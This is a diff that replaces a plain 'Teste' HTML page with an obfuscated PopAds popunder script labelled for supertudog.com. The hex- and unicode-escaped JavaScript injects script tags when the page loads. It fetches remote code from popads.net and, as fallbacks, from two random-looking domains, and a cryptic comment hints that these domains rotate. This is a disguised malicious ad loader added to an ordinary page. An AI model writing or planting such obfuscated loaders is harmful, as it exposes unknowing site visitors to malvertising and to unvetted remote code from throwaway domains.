@@ -1,12 +1,8 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Teste</title>
-</head>
-<body>
-    <h1>Teste</h1>
-</body>
-</html>
+<!-- PopAds.net Popunder Code for supertudog.com | 2019-09-07,369657,0,0 -->
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+/* Privet darkv. Each domain is 2h fox dead */
+ (function(){ var y=window;y["_\u0070\x6fp"]=[["\x73i\x74\x65I\u0064",369657],["m\u0069n\x42id",0],["\x70\u006fp\u0075\u006e\x64er\x73\x50\x65rI\x50",0],["\x64\u0065\u006c\x61\u0079Betwee\x6e",0],["\x64\u0065\x66au\x6c\u0074",false],["\x64e\u0066a\u0075\u006ctP\u0065\x72\u0044a\x79",0],["\x74\x6f\u0070m\x6f\x73t\u004c\u0061\u0079\u0065\x72",!0]];var q=["/\u002fc\u0031.\x70\u006f\u0070\x61\u0064\u0073\x2e\x6e\u0065\x74\x2f\u0070\x6fp\x2e\x6as","\u002f/c\x32\u002e\u0070\u006f\u0070\u0061\x64s\u002e\u006e\x65t\x2f\u0070\x6f\u0070.\u006a\x73","\x2f\x2f\u0077\u0077\x77\u002e\x79vv\x78jk\u007a\x69\x2e\x63\x6fm\u002fm\u006cu\x74\x2e\x6a\u0073","\x2f\x2f\u0077\x77w\u002e\u006c\x72\u0075\x76\u0076\u006cet\x6e\x68v.\u0063\x6fm/sr\x6b\u002ej\u0073",""],u=0,g,w=function(){if(""==q[u])return;g=y["\x64\x6f\x63u\x6den\x74"]["\u0063r\u0065\u0061\x74\x65\x45\u006c\u0065\u006de\u006e\x74"]("s\x63rip\u0074");g["ty\x70\u0065"]="te\u0078\u0074\u002fja\x76a\u0073\u0063\u0072i\u0070t";g["\u0061\x73\x79n\x63"]=!0;var i=y["d\u006f\x63um\u0065\u006e\u0074"]["\x67\x65t\u0045\x6cem\u0065\x6ets\u0042y\u0054a\u0067\x4e\x61\u006d\u0065"]("\u0073c\x72\u0069\u0070\x74")[0];g["src"]=q[u];if(u<2){g["\u0063ro\u0073\x73\u004f\x72ig\x69n"]="\u0061\x6eonymou\u0073";};g["\u006fne\u0072r\u006f\x72"]=function(){u++;w()};i["\u0070\x61r\x65\x6e\u0074\x4e\u006f\x64e"]["in\x73e\x72t\u0042e\x66\u006f\x72\x65"](g,i)};w()})();
+/*]]>/* */
+</script>
+
